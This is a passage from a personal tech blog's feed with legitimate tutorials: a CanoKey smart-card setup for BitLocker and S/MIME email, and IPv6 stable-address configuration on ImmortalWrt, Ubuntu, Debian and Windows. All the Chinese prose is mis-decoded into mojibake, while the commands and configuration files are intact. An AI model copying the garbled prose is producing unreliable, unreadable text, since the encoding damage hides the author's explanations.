class="attr">HashAlgorithm</span> = <span class="string">&quot;SHA512&quot;</span></span><br><span class="line"><span class="attr">EncryptionAlgorithm</span> = <span class="string">&quot;AES&quot;</span></span><br><span class="line"><span class="attr">EncryptionLength</span> = <span class="number">256</span></span><br><span class="line"><span class="attr">KeySpec</span> = <span class="string">&quot;AT_KEYEXCHANGE&quot;</span></span><br><span class="line"><span class="attr">KeyUsage</span> = <span class="string">&quot;CERT_KEY_ENCIPHERMENT_KEY_USAGE&quot;</span></span><br><span class="line"><span class="attr">KeyUsageProperty</span> = <span class="string">&quot;NCRYPT_ALLOW_DECRYPT_FLAG&quot;</span></span><br><span class="line"><span class="attr">RequestType</span> = Cert</span><br><span class="line"><span class="attr">SMIME</span> = <span class="literal">FALSE</span></span><br><span class="line"></span><br><span class="line"><span class="section">[EnhancedKeyUsageExtension]</span></span><br><span class="line"><span class="attr">OID</span>=<span class="number">1.3</span>.<span class="number">6.1</span>.<span class="number">5.5</span>.<span class="number">7.3</span>.<span class="number">1</span></span><br><span class="line"><span class="attr">OID</span>=<span class="number">1.3</span>.<span class="number">6.1</span>.<span class="number">5.5</span>.<span class="number">7.3</span>.<span class="number">2</span></span><br><span class="line"><span class="attr">OID</span>=<span class="number">1.3</span>.<span class="number">6.1</span>.<span class="number">4.1</span>.<span class="number">311.67</span>.<span class="number">1.1</span></span><br><span class="line"><span class="attr">OID</span>=<span class="number">1.3</span>.<span class="number">6.1</span>.<span class="number">4.1</span>.<span class="number">311.10</span>.<span class="number">3.4</span></span><br><span class="line"><span class="attr">OID</span>=<span class="number">1.3</span>.<span class="number">6.1</span>.<span class="number">4.1</span>.<span class="number">311.10</span>.<span class="number">3.12</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œå‘½ä»¤<code>certreq â€“new certreqcfg.ini certrequest.req</code><br>å¦‚æœæ²¡æœ‰é”™è¯¯ï¼Œé‚£ä¹ˆè¯ä¹¦å°±å·²ç»æˆåŠŸç”Ÿæˆå¹¶å®‰è£…äº†ã€‚  </p><p>è¿è¡Œå‘½ä»¤<code>certmgr.msc</code>æ‰“å¼€è¯ä¹¦ç®¡ç†å™¨<br><img src="/pictures/canokey-canary/6.png">  </p><p>å³é”®<code>æ‰€æœ‰ä»»åŠ¡-&gt;å¯¼å‡º</code>ï¼Œé€‰æ‹©<code>æ˜¯ï¼Œå¯¼å‡ºç§é’¥</code>ï¼Œå¯¼å‡ºpfxæ–‡ä»¶å‘½åä¸º<code>9a.pfx</code>ã€‚</p><p>ç”±äºæ˜¯è‡ªç­¾åè¯ä¹¦ï¼Œéœ€è¦æ·»åŠ æ³¨å†Œè¡¨å…è®¸è‡ªç­¾å<br>ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\FVE /v SelfSignedCertificates2 /t REG_DWORD /d &quot;1&quot;</span><br></pre></td></tr></table></figure><p>ä¸‹è½½å®‰è£… <a href="https://developers.yubico.com/yubico-piv-tool/Releases/">yubico-piv-tool</a><br><img src="/pictures/canokey-canary/7.png">  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># ç¡®è®¤æ˜¯å¦èƒ½æ£€æµ‹åˆ°Canokey</span><br><span class="line">$ yubico-piv-tool -r canokeys -a status</span><br><span class="line"></span><br><span class="line"># ä¿®æ”¹ PINã€PUK</span><br><span class="line">$ yubico-piv-tool -r canokeys -a change-pin</span><br><span class="line">$ yubico-piv-tool -r canokeys -a change-puk</span><br><span class="line"></span><br><span class="line"># å¯¼å…¥å¯†é’¥</span><br><span class="line">$ yubico-piv-tool -r canokeys -s 9a -i 9a.pfx -KPKCS12 -a import-key -a import-cert</span><br><span class="line"></span><br><span class="line"># åˆå§‹åŒ– Card Holder Unique Identifier å’Œ CCC</span><br><span class="line">$ yubico-piv-tool -r canokeys -a set-chuid</span><br><span class="line">$ yubico-piv-tool -r canokeys -a set-ccc</span><br><span class="line"></span><br><span class="line"># ç¡®è®¤æ˜¯å¦å¯¼å…¥æˆåŠŸ</span><br><span class="line">$ yubico-piv-tool -r canokeys -a status</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼ŒCanokey å°±å¯ä»¥ç”¨äºè¿›è¡Œ Bitlocker åŠ å¯†äº†ã€‚åœ¨ä½¿ç”¨ Bitlocker æ—¶ï¼Œé€‰æ‹©â€œä½¿ç”¨æ™ºèƒ½å¡â€å³å¯ã€‚</p><p><strong>æ¸…ç†ä¸å–„å</strong><br>0.å°†å¯¼å‡ºçš„è¯ä¹¦åƒå¯¹å¾…ä¸Šæ–‡ä¸­çš„GPGè¯ä¹¦ä¸€æ ·è¿›è¡Œå¤‡ä»½ã€‚<br>1.åˆ é™¤å¯¼å‡ºçš„åŒ…å«ç§é’¥çš„è¯ä¹¦æ–‡ä»¶<code>9a.pfx</code>ã€‚<br>2.åœ¨ Windows çš„è¯ä¹¦ç®¡ç†å™¨ä¸­åˆ æ‰ç”Ÿæˆçš„è¯ä¹¦ï¼Œè¯ä¹¦åŒæ—¶å­˜å‚¨åœ¨<code>ä¸ªäºº</code> å’Œ <code>ä¸­é—´è¯ä¹¦é¢å‘æœºæ„</code>ä¸‹ï¼Œè¦åŒæ—¶åˆ æ‰ã€‚<br>3.åˆ é™¤ç”³è¯·è¯ä¹¦è¿‡ç¨‹ä¸­çš„ ini å’Œ req æ–‡ä»¶ã€‚  </p><h4 id="S-MIMEç”µå­é‚®ä»¶åŠ å¯†"><a href="#S-MIMEç”µå­é‚®ä»¶åŠ å¯†" class="headerlink" title="S&#x2F;MIMEç”µå­é‚®ä»¶åŠ å¯†"></a>S&#x2F;MIMEç”µå­é‚®ä»¶åŠ å¯†</h4><p><strong>å‡†å¤‡å·¥ä½œ</strong><br>ä» <a href="https://www.actalis.com/request-s-mime-certificate">Actalis</a> ç”³è¯·ä¸€ä¸ªå…è´¹çš„S&#x2F;MIMEè¯ä¹¦ å‚è€ƒ<a href="https://blog.goodboyboy.top/posts/851058316.html">å…è´¹ç”³è¯·S&#x2F;MIMEé‚®ç®±è¯ä¹¦</a><br>å®‰è£… <a href="https://www.thunderbird.net/zh-CN/thunderbird/all/">Thunderbird</a><br>å®‰è£… <a href="https://github.com/OpenSC/OpenSC/releases">OpenSC</a><br>å®‰è£… <a href="https://developers.yubico.com/yubico-piv-tool/Releases/">yubico-piv-tool</a>  </p><p>å¯¼å…¥è¯ä¹¦ï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ yubico-piv-tool -r canokeys -s 9c -i certificate.p12 -KPKCS12 -a import-key -a import-cert --pin-policy=once</span><br></pre></td></tr></table></figure><p>å¦‚æœä½ æœ‰ä¸æ­¢ä¸€ä¸ªé‚®ç®±çš„è¯ä¹¦å¯ä»¥ç»§ç»­å¯¼å…¥<code>9d</code>, <code>9e</code>æ§½ä½ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å¯¼å…¥å‘½ä»¤çš„åé¢é™„åŠ <code>--pin-policy</code>æˆ–<code>--touch-policy</code>é€‰é¡¹è¦†ç›–æ‰é»˜è®¤è§„åˆ™ï¼Œé˜²æ­¢é»˜è®¤è§„åˆ™ä¸‹<code>9e</code>æ§½ä½å¯ä»¥ä¸ç»éªŒè¯è¢«ç›´æ¥ä½¿ç”¨ã€‚è¯¦ç»†ä½¿ç”¨æ–¹æ³•å‚è€ƒï¼š <a href="https://developers.yubico.com/yubico-piv-tool/Manuals/yubico-piv-tool.1.html">https://developers.yubico.com/yubico-piv-tool/Manuals/yubico-piv-tool.1.html</a>  </p><p><strong>å†²çªé¢„é˜²</strong><br>å¦‚æœä½ ä¾ç…§ä¸Šæ–‡é…ç½®äº†GPGï¼Œåœ¨ä¸åšä¿®æ”¹çš„æƒ…å†µä¸‹GPGä¼šå’ŒOpenSCèµ·å†²çªã€‚<br>å‚è€ƒï¼š <a href="https://blog.apdu.fr/posts/2024/12/gnupg-and-pcsc-conflicts-episode-3/">GnuPG and PC&#x2F;SC conflicts, episode 3</a><br>åœ¨<code>%AppData%\gnupg\scdaemon.conf</code>ä¸­å†™å…¥(æ²¡æœ‰å°±æ–°å»ºä¸€ä¸ª)ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">disable-ccid</span><br><span class="line">pcsc-shared</span><br></pre></td></tr></table></figure><p>ç„¶åå¼€ä»»åŠ¡ç®¡ç†å™¨ï¼Œæ‰¾åˆ°<code>gpg-agent.exe</code>ï¼ˆå¦‚æœ‰ï¼‰ï¼Œå³é”®ç»“æŸè¿›ç¨‹æ ‘ã€‚</p><p><strong>é…ç½®<code>Thunderbird</code></strong><br><img src="/pictures/canokey-canary/8.png"><br><img src="/pictures/canokey-canary/9.png"><br>é€‰æ‹© <code>C:\Program Files\OpenSC Project\OpenSC\pkcs11\opensc-pkcs11.dll</code>  </p><p>åŠ è½½åå°±å¯ä»¥çœ‹åˆ°Canokeyäº†ï¼ˆé‡ç”¨ä¸€ä¸‹ä¸Šé¢çš„å›¾ï¼‰<br><img src="/pictures/canokey-canary/5.png">  </p><p>é€‰æ‹©ä¸é‚®ç®±å¯¹åº”çš„è¯ä¹¦<br><img src="/pictures/canokey-canary/10.png">  </p><p>ç„¶ååœ¨å†™ä¿¡æ—¶å°±å¯ä»¥é€‰æ‹©ç­¾å&#x2F;åŠ å¯†äº†<br><img src="/pictures/canokey-canary/11.png">  </p><p>åˆ«äººæ”¶åˆ°ä»¥åæ˜¯è¿™ä¹ˆä¸€ä¸ªæ•ˆæœï¼š<br><img src="/pictures/canokey-canary/12.png">  </p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;å¼•è¨€&quot;&gt;&lt;a href=&quot;#å¼•è¨€&quot; class=&quot;headerlink&quot; title=&quot;å¼•è¨€&quot;&gt;&lt;/a&gt;å¼•è¨€&lt;/h3&gt;&lt;p&gt;ç¬¬ä¸€æ¬¡æ¥è§¦Canokeyè¿˜æ˜¯åœ¨2021å¹´ï¼Œå½“æ—¶è·Ÿé£ä¹°äº†CanoKey Pigeoné¦–å‘ï¼Œåˆ°æ‰‹ä»¥åæŠŠGPGå¯†é’¥å¡è¿›å»å†åŠ åˆ°å‡ ä¸ªç½‘ç«™åšè®¤è¯å™¨ä»¥åå°±ä¸€ç›´æ˜¯åŠåƒç°çŠ¶æ€ï¼Œæ¯•ç«Ÿç½‘ç«™çš„ç™»å½•ä¸ä¼šå¤©å¤©æ‰ï¼Œè€ŒGPGæ›´æ˜¯ä¸€ä¸‡å¹´æ²¡äººç»™æˆ‘å‘åŠ å¯†çš„ä¿¡æ¯ï¼Œè¿ç”¨æ¥gitç­¾åçš„æ¬¡æ•°éƒ½å°‘ï¼ˆæˆ‘æ‡’ï¼‰ã€‚  &lt;/p&gt;
&lt;p&gt;å‰æ®µCanokeyç¾¤æŠ½å¥–é€Canaryæµ‹è¯•ç‰ˆï¼Œæœ¬äººæœ‰å¹¸ä¸­å¾—ä¸€ä¸ªï¼š&lt;br&gt;&lt;img src=&quot;/pictures/canokey-canary/1.png&quot;&gt;   &lt;/p&gt;
&lt;p&gt;é‚£è¿™ä¸å†æŠ˜è…¾ä¸€ä¸‹ä¼¼ä¹å°±æœ‰ç‚¹ä¸åˆé€‚äº†ã€‚  &lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;ç¯å¢ƒç¡®è®¤&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒç¡®è®¤&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒç¡®è®¤&quot;&gt;&lt;/a&gt;ç¯å¢ƒç¡®è®¤&lt;/h3&gt;&lt;p&gt;ç¡¬ä»¶ä¿¡æ¯ï¼š&lt;br&gt;&amp;emsp;&amp;emsp;CanoKey Canaryï¼ˆ3.0.0-rc2-0 dirty buildï¼‰&lt;br&gt;æ“ä½œç³»ç»Ÿï¼š&lt;br&gt;&amp;emsp;&amp;emsp;Windows 10 LTSB 21H2&lt;br&gt;è½¯ä»¶ç‰ˆæœ¬ï¼š&lt;br&gt;&amp;emsp;&amp;emsp;gpg4win 4.4 (gpg 2.4.7)&lt;br&gt;&amp;emsp;&amp;emsp;OpenSC 0.26.0  &lt;/p&gt;</summary>
    
    
    
    <category term="æŠ˜è…¾é‚£äº›äº‹" scheme="https://thinkalone.win/categories/%E6%8A%98%E8%85%BE%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="æŠ˜è…¾é‚£äº›äº‹" scheme="https://thinkalone.win/tags/%E6%8A%98%E8%85%BE%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>åœ¨2024å¹´é…ç½®IPv6æ˜¯ä»€ä¹ˆæ€æ ·ä¸€ç§ä½“éªŒ</title>
    <link href="https://thinkalone.win/ipv6-in-2024.html"/>
    <id>https://thinkalone.win/ipv6-in-2024.html</id>
    <published>2024-09-01T04:00:00.000Z</published>
    <updated>2024-09-15T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Do-not-æ‰‹æ¬ "><a href="#Do-not-æ‰‹æ¬ " class="headerlink" title="Do not æ‰‹æ¬ "></a>Do not æ‰‹æ¬ </h3><p>å‰æ®µæ—¶é—´ç»™å®½å¸¦æ”¹äº†ä¸ªå¥—é¤ï¼Œå…¬ç½‘IPv4æ²¡äº†ï¼Œè¦ä¹Ÿä¸ç»™äº†ï¼Œè¢«è¿«å¼€å§‹è½¬IPv6ã€‚</p><hr><h3 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h3><p>ä¸»è·¯ç”±ï¼š<br>&emsp;&emsp;ImmortalWrt 21.02<br>ç³»ç»Ÿï¼š<br>&emsp;&emsp;Windows 10 LTSB 21H2<br>&emsp;&emsp;Debian 12(bookworm)<br>&emsp;&emsp;Ubuntu 22.04 LTS(jammy)<br>ISP:<br>&emsp;&emsp;ä¸­å›½ç”µä¿¡(DHCPv6-PD)  </p><span id="more"></span> <h3 id="é…ç½®ç›®æ ‡"><a href="#é…ç½®ç›®æ ‡" class="headerlink" title="é…ç½®ç›®æ ‡"></a>é…ç½®ç›®æ ‡</h3><p>è®©éœ€è¦æä¾›æœåŠ¡çš„è®¾å¤‡è·å–åˆ°ç¨³å®šçš„éšç§åœ°å€ï¼Œå³ï¼š<br>1.ä¸ä½¿ç”¨eui64ï¼ˆé˜²æ­¢é€šè¿‡IPv6 SLAAC åœ°å€åæ¨å®¢æˆ·ç«¯ MACï¼‰ã€‚<br>2.åœ°å€è¦å°½é‡å›ºå®šï¼Œæ–¹ä¾¿å†™é˜²ç«å¢™è§„åˆ™ã€‚  </p><h3 id="è·¯ç”±é…ç½®"><a href="#è·¯ç”±é…ç½®" class="headerlink" title="è·¯ç”±é…ç½®"></a>è·¯ç”±é…ç½®</h3><p>ImmortalWrté»˜è®¤æƒ…å†µä¸‹ç›´æ¥æ‹¨å·å°±ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªWAN6è™šæ‹Ÿæ¥å£ï¼Œå¯ä»¥è¯´æ˜¯ååˆ†çš„çœå¿ƒäº†ã€‚<br>ä¿®æ”¹é…ç½®å¦‚å›¾æ‰€ç¤ºï¼š<br>ç§ŸæœŸæ”¹ä¸º12å°æ—¶<br><img src="/pictures/ipv6-in-2024/1.png"><br>åˆ†é…é•¿åº¦&#x2F;64ï¼Œeui64æ–¹å¼ç”Ÿæˆè·¯ç”±çš„åœ°å€<br><img src="/pictures/ipv6-in-2024/2.png"><br>æ‰‹åŠ¨è®¾ç½®é€šå‘Šçš„DNSï¼Œä¸ä½¿ç”¨è¿è¥å•†çš„<br><img src="/pictures/ipv6-in-2024/3.png"><br>å¼€å¯SLAACï¼Œé…ç½®Mã€Oæ ‡ç­¾<br><img src="/pictures/ipv6-in-2024/4.png">  </p><p>è¿™é‡Œçš„é…ç½®åŒæ—¶å¼€å¯äº†Stateless(SLAAC)å’ŒStateful(DHCPv6)  </p><p>ç›®å‰ï¼š<br>&emsp;&emsp;å®‰å“è®¾å¤‡åªæ”¯æŒStatelessæ–¹å¼è·å–IPv6åœ°å€<br>&emsp;&emsp;ç±»Debianç³»ç»Ÿå¯¹Statelesså’ŒStatefulçš„æ”¯æŒéƒ½ç›¸å¯¹å®Œå–„<br>&emsp;&emsp;Windowsç³»ç»Ÿ(Window 10 21H2)å¯¹Statelessçš„æ”¯æŒç›¸å¯¹å®Œå–„ï¼Œå¯¹Statefulçš„æ”¯æŒæœ‰é—®é¢˜  </p><p>æ‰€ä»¥ä½ å®Œå…¨å¯ä»¥<a href="https://github.com/immortalwrt/user-FAQ/blob/main/immortalwrt%20%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%8C%87%E5%8C%97.md">æŒ‰æ•™ç¨‹åªä½¿ç”¨Stateless</a>ï¼Œæˆ‘åŒæ—¶å¼€çº¯ç²¹æ˜¯æ²¡äº‹æ‰¾äº‹ã€‚  </p><h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h3><p>Ubuntu 20+ç‰ˆæœ¬é»˜è®¤ä½¿ç”¨Netplanç®¡ç†ç½‘ç»œ  </p><figure class="highlight yaml"><figcaption><span>&#x2F;etc&#x2F;netplan&#x2F;00-default-config.yaml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">network:</span></span><br><span class="line">  <span class="attr">version:</span> <span class="number">2</span></span><br><span class="line">  <span class="attr">renderer:</span> <span class="string">networkd</span></span><br><span class="line">  <span class="attr">ethernets:</span></span><br><span class="line">    <span class="attr">enp2s0:</span></span><br><span class="line">      <span class="attr">dhcp4:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">dhcp6:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">ipv6-privacy:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">ipv6-address-token:</span> <span class="string">::dead:beef:114:514</span></span><br><span class="line">      <span class="comment"># è¿™é‡Œçš„tokenå¯ä»¥è‡ªå·±éšæ„æ”¹ï¼Œåªè¦ç¬¦åˆè§„èŒƒå°±å¥½</span></span><br><span class="line">      <span class="comment"># ä»¥è¿™ä¸ªtokenä¸ºä¾‹ï¼Œå‡è®¾ISPç»™çš„PDå‰ç¼€æ˜¯240e:1234:4567:9100::/64  </span></span><br><span class="line">      <span class="comment"># è™½ç„¶ä¸­å›½ç”µä¿¡ä¸€èˆ¬éƒ½æ˜¯ç»™/56ï¼Œä½†æ˜¯å‰é¢åœ¨è·¯ç”±çš„è®¾ç½®é‡Œæ”¹æˆäº†/64ï¼Œä¸­é—´éš”å¼€ä¸¤ä¸ª0åœ°å€å¥½çœ‹ä¸€äº›  </span></span><br><span class="line">      <span class="comment"># é‚£ä¹ˆæœ€ç»ˆçš„åœ°å€ä¼šæ˜¯240e:1234:4567:9100:dead:beef:114:514</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure><h3 id="Debian"><a href="#Debian" class="headerlink" title="Debian"></a>Debian</h3><p>é¦–å…ˆé…ç½®è®©networkdæ¥ç®¡ç†ç½‘ç»œ  </p><figure class="highlight bash"><figcaption><span>Bash</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> /etc/network/interfaces /etc/network/interfaces.save  </span><br><span class="line"><span class="built_in">mv</span> /etc/network/interfaces.d /etc/network/interfaces.d.save  </span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">enable</span> systemd-networkd.service  </span><br><span class="line">systemctl start systemd-networkd.service  </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><figcaption><span>&#x2F;etc&#x2F;systemd&#x2F;network&#x2F;default.network</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[Match]</span><br><span class="line">Name=eth0</span><br><span class="line"></span><br><span class="line">[Network]</span><br><span class="line">DHCP=yes</span><br><span class="line">IPv6AcceptRA=yes</span><br><span class="line">IPv6PrivacyExtensions=no</span><br><span class="line"></span><br><span class="line">[IPv6AcceptRA]</span><br><span class="line">Token=::dead:beef:114:514</span><br><span class="line"># tokenéƒ¨åˆ†è§£é‡ŠåŒä¸Š</span><br></pre></td></tr></table></figure><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>Update: Windowåœ¨è¿™é‡Œçº¯å±ç‰¹ä¾‹ï¼Œå®ƒæ—¢æ²¡æœ‰RFC 7217æ”¯æŒï¼Œä¹Ÿæ²¡æœ‰tokenæ”¯æŒï¼ˆè‡³å°‘Window 10 21H2å®Œå…¨æ²¡æœ‰ï¼‰<br>æ‰€ä»¥è¿™é‡Œè¢«è¿«ä½¿ç”¨eui64ï¼ŒåŒæ—¶ä¸ºäº†éšç§ä¿æŠ¤æ›´æ”¹æ‰åŸå§‹çš„MACåœ°å€  </p><p>ä»¥ç®¡ç†å‘˜å¯åŠ¨Powershellï¼š  </p><figure class="highlight powershell"><figcaption><span>Powershell</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-NetIPv6Protocol</span> <span class="literal">-RandomizeIdentifiers</span> Disabled</span><br><span class="line"><span class="comment"># å…³é—­éšæœºåœ°å€ç”Ÿæˆ</span></span><br><span class="line"><span class="comment"># è¿™ä¸€é¡¹è®¾ç½®ä¸ºEnabledæ—¶Windowsä½¿ç”¨eui64</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-NetIPv6Protocol</span> <span class="literal">-UseTemporaryAddresses</span> Disabled</span><br><span class="line"><span class="comment"># ç¦æ­¢Windowsä½¿ç”¨éšç§åœ°å€ï¼ˆRFC 4941ï¼‰</span></span><br></pre></td></tr></table></figure><h3 id="è§£é‡Šéƒ¨åˆ†"><a href="#è§£é‡Šéƒ¨åˆ†" class="headerlink" title="è§£é‡Šéƒ¨åˆ†"></a>è§£é‡Šéƒ¨åˆ†</h3><p>è¿™æ ·é…ç½®ä¸‹æ¥ä»¥åï¼Œæ¯ä¸ªè®¾å¤‡ç†è®ºä¸Šèƒ½è·å¾—ä¸¤ç»„IPV6åœ°å€ï¼Œä¸€ä¸ªSLAACæ¥çš„ï¼Œä¸€ä¸ªDHCP V6åˆ†çš„ï¼Œ<br>ä¸­å›½ç”µä¿¡æ¯è¿‡å‡ å¤©å°±ä¼šæŠŠæ‹¨å·æ–­å¼€é‡è¿å¯¼è‡´PDå‰ç¼€å˜åŒ–ï¼Œç”±äºSLAACå¾—åˆ°çš„åœ°å€ä¼šå¾ˆå¿«çš„æ›´æ–°ï¼Œåœ¨æ‰€æœ‰ç³»ç»Ÿä¸Šä¹Ÿéƒ½ä¼šå¾ˆå¿«çš„æ¢å¤è¿æ¥ã€‚<br>DHCP V6å°±ä¸ä¸€å®šäº†ï¼Œæˆ‘å°†ç§ŸæœŸè®¾ç½®ä¸ºäº†12å°æ—¶ï¼Œç±»Debianç³»ç»Ÿæ¯è¿‡12å°æ—¶éƒ½ä¼šé‡æ–°å‘DHCPæœåŠ¡å™¨è¦åœ°å€ï¼Œè¿™å¾ˆå¥½ã€‚<br>ä½†æ˜¯Windowsä¸ä¼šï¼Œæ— è®ºæˆ‘æ€ä¹ˆæ›´æ”¹è®¾ç½®ï¼ŒWindowsæ€»èƒ½ç»™æˆ‘æ•´å‡ºæ¥ä¸€ä¸ªä¸‰å¤©ç§ŸæœŸçš„èŠ±æ´»ï¼Œ<br>ç„¶åå› ä¸ºå‰ç¼€å˜åŒ–ï¼ŒåŸæ¥çš„åœ°å€å¤±æ•ˆæ— æ³•è®¿é—®äº†ï¼ŒWindowså°±ä¼šè‡ªå·±æ•´å‡ºæ¥ä¸€ä¸ªæ–°çš„éšç§åœ°å€ç”¨è¿›è€Œå¯¼è‡´é˜²ç«å¢™è§„åˆ™å¤±æ•ˆã€‚<br>å½“ç„¶ï¼Œæœ¬æ–‡ä¸­ä»‹ç»çš„æ–¹æ³•ä¸æ˜¯RFC 7217ï¼Œéœ€è¦RFC 7217è¯·æŸ¥çœ‹å‚è€ƒèµ„æ–™ï¼Œåæ­£æˆ‘æ˜¯æ„Ÿè§‰7217å‡ºæ¥çš„åœ°å€å¤ªé•¿è¿˜ä¸å¥½çœ‹ã€‚  </p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><p><a href="https://wiki.archlinuxcn.org/wiki/Systemd-networkd">https://wiki.archlinuxcn.org/wiki/Systemd-networkd</a></p><p><a href="https://wiki.archlinuxcn.org/wiki/IPv6#%E7%A8%B3%E5%AE%9A%E7%9A%84%E9%9A%90%E7%A7%81%E5%9C%B0%E5%9D%80">https://wiki.archlinuxcn.org/wiki/IPv6#%E7%A8%B3%E5%AE%9A%E7%9A%84%E9%9A%90%E7%A7%81%E5%9C%B0%E5%9D%80</a></p><p><a href="https://wiki.debian.org/SystemdNetworkd">https://wiki.debian.org/SystemdNetworkd</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;Do-not-æ‰‹æ¬ &quot;&gt;&lt;a href=&quot;#Do-not-æ‰‹æ¬ &quot; class=&quot;headerlink&quot; title=&quot;Do not æ‰‹æ¬ &quot;&gt;&lt;/a&gt;Do not æ‰‹æ¬ &lt;/h3&gt;&lt;p&gt;å‰æ®µæ—¶é—´ç»™å®½å¸¦æ”¹äº†ä¸ªå¥—é¤ï¼Œå…¬ç½‘IPv4æ²¡äº†ï¼Œè¦ä¹Ÿä¸ç»™äº†ï¼Œè¢«è¿«å¼€å§‹è½¬IPv6ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒ&quot;&gt;&lt;/a&gt;ç¯å¢ƒ&lt;/h3&gt;&lt;p&gt;ä¸»è·¯ç”±ï¼š&lt;br&gt;&amp;emsp;&amp;emsp;ImmortalWrt 21.02&lt;br&gt;ç³»ç»Ÿï¼š&lt;br&gt;&amp;emsp;&amp;emsp;Windows 10 LTSB 21H2&lt;br&gt;&amp;emsp;&amp;emsp;Debian 12(bookworm)&lt;br&gt;&amp;emsp;&amp;emsp;Ubuntu 22.04 LTS(jammy)&lt;br&gt;ISP:&lt;br&gt;&amp;emsp;&amp;emsp;ä¸­å›½ç”µä¿¡(DHCPv6-PD)  &lt;/p&gt;</summary>
    
    
    
    <category term="æŠ˜è…¾é‚£äº›äº‹" scheme="https://thinkalone.win/categories/%E6%8A%98%E8%85%BE%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="æŠ˜è…¾é‚£äº›äº‹" scheme="https://thinkalone.win/tags/%E6%8A%98%E8%85%BE%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>ç”¨ Orange Pi Zero æ­å»ºä¸€å° Stratum 1 çš„ NTP æœåŠ¡å™¨</title>
    <link href="https://thinkalone.win/orangepi-zero-ntp.html"/>
    <id>https://thinkalone.win/orangepi-zero-ntp.html</id>
    <published>2024-07-11T04:00:00.000Z</published>
    <updated>2024-07-11T04:00:00.000Z</updated>
    
